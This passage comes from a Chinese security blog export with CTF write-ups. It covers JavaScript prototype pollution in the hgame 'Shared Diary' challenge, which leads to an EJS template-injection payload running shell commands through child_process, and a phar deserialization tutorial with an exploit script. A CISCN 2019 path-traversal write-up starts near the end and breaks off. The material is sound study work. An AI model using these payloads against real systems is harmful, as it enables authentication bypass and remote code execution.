class="property">b</span>)</span><br></pre></td></tr></table></figure><br><img src="/2024/01/28/%E5%88%9D%E6%8E%A2JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/5.png" class="" title="Alt text"></p>
<p>我们可以发现b值并没有被插入到a和b的原型里，这是因为javascript在创建对象a时会直接将<code>__proto__</code>当成其原型，而不是键值，导致a的键值被解析为<code>num</code>和<code>b</code>那么就会导致这句代码<code>target[key] = source[key]</code>不会修改a和b的原型。<br>那么我们应该这么才能将<strong>proto</strong>当成键值呢?很简单只要将对象以json的格式写入，当以json的格式写入时就会将<strong>proto</strong>解析为键值。<br><img src="/2024/01/28/%E5%88%9D%E6%8E%A2JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/4.png" class="" title="Alt text"><br>我们看上图可以发现将对象以json形式传入函数，函数将<strong>proto</strong>当成了键成功修改了原型的值，时得b.b不为未定义,为bbb。<br>这说明了原型链被污染。</p>
<h1 id="实例，hgame-week-4-Shared-Diary-Antel0p3"><a href="#实例，hgame-week-4-Shared-Diary-Antel0p3" class="headerlink" title="实例，hgame week 4 Shared Diary Antel0p3"></a>实例，hgame week 4 Shared Diary Antel0p3</h1><p>这题我们登陆进去发现是一个登陆框，题目写了这个是用js进行编写的登陆框，我们下载源码。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> randomize = <span class="built_in">require</span>(<span class="string">&#x27;randomatic&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="comment">// Prevent prototype pollution</span></span><br><span class="line">        <span class="keyword">if</span> (key === <span class="string">&#x27;__proto__&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Detected Prototype Pollution&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app</span><br><span class="line">    .<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;))</span><br><span class="line">    .<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&quot;./views&quot;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;session&#x27;</span>,</span><br><span class="line">    <span class="attr">secret</span>: <span class="title function_">randomize</span>(<span class="string">&#x27;aA0&#x27;</span>, <span class="number">16</span>),</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">false</span></span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&quot;/login&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// save userinfo to session</span></span><br><span class="line">        <span class="keyword">let</span> data = &#123;&#125;;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="title function_">merge</span>(data, req.<span class="property">body</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;login&quot;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;Don&#x27;t pollution my shared diary!&quot;</span>&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">data</span> = data</span><br><span class="line"></span><br><span class="line">        <span class="comment">// check password</span></span><br><span class="line">        <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">        user.<span class="property">password</span> = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line">        <span class="keyword">if</span> (user.<span class="property">password</span>=== <span class="string">&quot;testpassword&quot;</span>) &#123;</span><br><span class="line">            user.<span class="property">role</span> = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (user.<span class="property">role</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            req.<span class="property">session</span>.<span class="property">role</span> = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;login&quot;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;Login as admin or don&#x27;t touch my shared diary!&quot;</span>&#125;)</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;&quot;</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">data</span> || !req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span> || req.<span class="property">session</span>.<span class="property">role</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> diary = ejs.<span class="title function_">render</span>(<span class="string">`&lt;div&gt;<span class="subst">$&#123;req.body.diary&#125;</span>&lt;/div&gt;`</span>)</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">diary</span> = diary</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;diary&#x27;</span>, &#123;<span class="attr">diary</span>: req.<span class="property">session</span>.<span class="property">diary</span>, <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;diary&#x27;</span>, &#123;<span class="attr">diary</span>: req.<span class="property">session</span>.<span class="property">diary</span>, <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8888</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>);</span><br></pre></td></tr></table></figure><br>可以发现该网站有两个路由分别为/和/login我们查看/login路由的函数<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">all</span>(<span class="string">&quot;/login&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// save userinfo to session</span></span><br><span class="line">        <span class="keyword">let</span> data = &#123;&#125;;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="title function_">merge</span>(data, req.<span class="property">body</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;login&quot;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;Don&#x27;t pollution my shared diary!&quot;</span>&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">data</span> = data</span><br><span class="line"></span><br><span class="line">        <span class="comment">// check password</span></span><br><span class="line">        <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">        user.<span class="property">password</span> = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line">        <span class="keyword">if</span> (user.<span class="property">password</span>=== <span class="string">&quot;testpassword&quot;</span>) &#123;</span><br><span class="line">            user.<span class="property">role</span> = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (user.<span class="property">role</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            req.<span class="property">session</span>.<span class="property">role</span> = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;login&quot;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;Login as admin or don&#x27;t touch my shared diary!&quot;</span>&#125;)</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;&quot;</span>&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><br>可以发现其调用了merge()函数将我们传入的body拼接到一个空对象data上我们来分析一下merge函数<br><img src="/2024/01/28/%E5%88%9D%E6%8E%A2JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/6.png" class="" title="Alt text"><br>我们可以发现<code>target[key] = source[key]</code>那么很明显这应该是一个原型链污染。那么我们只要控制source也就是我们传入的body对原型链进行修改即可，但是函数将<strong>proto</strong>进行了过滤，我们可以使用<code>&#123;constructor:&#123;prototype:&#123;&#125;&#125;&#125;</code>来指向其原型</p>
<p>继续分析源码，我们可以发现其将data传到了req.session.data，之后只要<code>user.role===admin</code>就可以跳到<code>/</code>路由，这时候我们可以使用原型链污染，因为user的原型与data的原型都为Object.prototype那么我们就可以给原型传入一个role为admin这样就可以绕过登陆路解码到达<code>/</code>路由</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">data</span> || !req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span> || req.<span class="property">session</span>.<span class="property">role</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> diary = ejs.<span class="title function_">render</span>(<span class="string">`&lt;div&gt;<span class="subst">$&#123;req.body.diary&#125;</span>&lt;/div&gt;`</span>)</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">diary</span> = diary</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;diary&#x27;</span>, &#123;<span class="attr">diary</span>: req.<span class="property">session</span>.<span class="property">diary</span>, <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;diary&#x27;</span>, &#123;<span class="attr">diary</span>: req.<span class="property">session</span>.<span class="property">diary</span>, <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span>&#125;);</span><br></pre></td></tr></table></figure>
<p>这个路由我们分析一下，发现如果<code>req.session.data</code>，<code>req.session.data.username</code>为空或者<code>req.session.role</code> 不为admin的话会跳转到登陆界面。所以除了传入我们要修改的原型链的值，还要传入username，绕过登陆的payload如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;role&quot;:&quot;admin&quot;&#125;&#125;,&quot;username&quot;:&quot;lsss&quot;&#125;</span><br></pre></td></tr></table></figure><br><img src="/2024/01/28/%E5%88%9D%E6%8E%A2JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/7.png" class="" title="Alt text"><br>放包后成功绕过登陆<br>之后我们继续查看源码<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> diary = ejs.<span class="title function_">render</span>(<span class="string">`&lt;div&gt;<span class="subst">$&#123;req.body.diary&#125;</span>&lt;/div&gt;`</span>)</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">diary</span> = diary</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;diary&#x27;</span>, &#123;<span class="attr">diary</span>: req.<span class="property">session</span>.<span class="property">diary</span>, <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span>&#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>我们可以看到其使用了ejs框架，直接将变量req.body.diary塞到框架里没有任何过滤我们可以使用ejs的ssti模板注入注入语句在网上一查就能查到<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%- global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;ls /&#x27;) %&gt;</span><br><span class="line">&lt;%- global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat</span><br><span class="line">/flag&#x27;) %&gt;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>node.js</category>
        <category>原型链污染</category>
      </categories>
      <tags>
        <tag>原型链污染</tag>
      </tags>
  </entry>
  <entry>
    <title>初探phar反序列化</title>
    <url>/2024/03/20/%E5%88%9D%E6%8E%A2phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="在NSS刷题的时候遇到了phar反序列化的题目我个人认为有必要学习一下这个漏洞因此写下这篇文章。"><a href="#在NSS刷题的时候遇到了phar反序列化的题目我个人认为有必要学习一下这个漏洞因此写下这篇文章。" class="headerlink" title="在NSS刷题的时候遇到了phar反序列化的题目我个人认为有必要学习一下这个漏洞因此写下这篇文章。"></a>在NSS刷题的时候遇到了phar反序列化的题目我个人认为有必要学习一下这个漏洞因此写下这篇文章。</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我们都知道一般的php反序列化都需要一个参数可控的unserialize函数。这就导致反序列化的条件可以说非常的苛刻。<br>但是在18年的blackhat大会上Sam Thomas 分享了 File Operation Induced Unserialization via the “phar://” Stream Wrapper ，该研究员指出该方法在 文件系统函数 （ file_get_contents 、 unlink 等）参数可控的情况下，配合 phar://伪协议 ，可以不依赖反序列化函数 unserialize() 直接进行反序列化的操作</p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>phar是将php文件打包的一种压缩文档，其类似于java的jar包。其特点是会以序列化的形式将用户自定义meta-data进行存储。当我们使用phar://伪协议读取该文件时，meta-data就会进行反序列化。这时候就会产生反序列漏洞。</p>
<h1 id="构造phar文件"><a href="#构造phar文件" class="headerlink" title="构造phar文件"></a>构造phar文件</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;lalalalalalalla&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);  <span class="comment">//生成一个phar文件，名字为phar.phar</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>(); <span class="comment">//下面细讲</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub内容</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将创建的对象a写入到Metadata中</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;testaaa&quot;</span>); <span class="comment">//添加要进行压缩的文件，文件名为test，文件内容为testaaa</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();<span class="comment">//</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我们可以使用如上代码生成phar文件并实现对phar文件Metadata内容的写入。<br><img src="/2024/03/20/%E5%88%9D%E6%8E%A2phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" class="" title="alt text"><br>我们查看phar文件会发现Metadata将对象进行了序列化写入。</p>
<h1 id="DEMO实验"><a href="#DEMO实验" class="headerlink" title="DEMO实验"></a>DEMO实验</h1><p>我们本地写一个DEMO来进行实验<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">haha</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;func);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file_name</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file_name</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>上面的demo并没有反序列化入口只有一个文件包含函数<br>EXP<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">haha</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>=<span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">haha</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);  <span class="comment">//生成一个phar文件，名字为phar.phar</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>(); <span class="comment">//下面细讲</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub内容</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将创建的对象a写入到Metadata中</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;testaaa&quot;</span>); <span class="comment">//添加要进行压缩的文件，文件名为test，文件内容为testaaa</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();<span class="comment">//</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>我们直接将生成的文件放到同一文件夹下进行实验<br><img src="/2024/03/20/%E5%88%9D%E6%8E%A2phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" class=""><br>我们可以看到在实验phar伪协议对phar文件压缩的文件进行读取时会成功反序列化.</p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="CISCN-2019华北Day1-Web1"><a href="#CISCN-2019华北Day1-Web1" class="headerlink" title="[CISCN 2019华北Day1]Web1"></a>[CISCN 2019华北Day1]Web1</h2><p>我就是刷到了这题才萌生了学习phar反序列化的想法<br>我们先进行注册<br>之后发现可以上传文件,发现只能上传照片,修改一下 MIME 类型会发现可以直接上传成功,但是会被修改成jpg.一开始我以为是条件竞争,看了一下wp发现不是,而是在文件下载的路由可以进行目录穿越.(对目录穿越还是不够敏感下次看到下载就要想到可能存在目录穿越)我们将filename改成/var/www/html/download.php来对文件进行读取<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><br>会发现这两行代码<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) </span><br></pre></td></tr></table></figure><br>getcwd()表示当前程序目录即/var/www/html,<br>其规定了不能直接读取flag,只能读取/var/www/html,/etc,/tmp的内容.即我们无法在这里读取到我们上传的文件.<br>我们可以发现其导入了class.php文件我们进行文件包含.<br>class.php<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span 